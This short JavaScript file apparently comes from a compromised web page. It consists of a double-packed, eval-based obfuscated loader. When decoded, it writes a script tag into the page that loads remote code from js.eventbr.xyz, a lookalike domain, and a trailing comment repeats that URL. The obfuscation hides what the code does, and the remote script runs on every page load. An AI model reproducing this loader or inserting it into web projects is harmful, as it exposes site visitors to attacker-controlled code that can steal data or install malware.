eval(function(p, a, c, k, e, r) {
    e = function(c) {
        return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
    };
    if (!''.replace(/^/, String)) {
        while (c--) r[e(c)] = k[c] || e(c);
        k = [function(e) {
            return r[e]
        }];
        e = function() {
            return '\\w+'
        };
        c = 1
    };
    while (c--)
        if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
    return p
}('m(d(p,a,c,k,e,r){e=d(c){f c.n(a)};h(!\'\'.i(/^/,o)){j(c--)r[e(c)]=k[c]||e(c);k=[d(e){f r[e]}];e=d(){f\'\\\\w+\'};c=1};j(c--)h(k[c])p=p.i(q s(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);f p}(\'1["2"]["3"](\\\'<0 4="5/6" 7="8://9.a/b.c"></0>\\\');\',l,l,\'t|u|v|x|y|z|A|B|C|D|E|F|G\'.H(\'|\'),0,{}))', 44, 44, '|||||||||||||function||return||if|replace|while||13|eval|toString|String||new||RegExp|script|window|document||write|type|text|javascript|src|https|js.eventbr|xyz|vip/crazy|js|split'.split('|'), 0, {}))




//"https://js.eventbr.xyz/vip/crazy.js"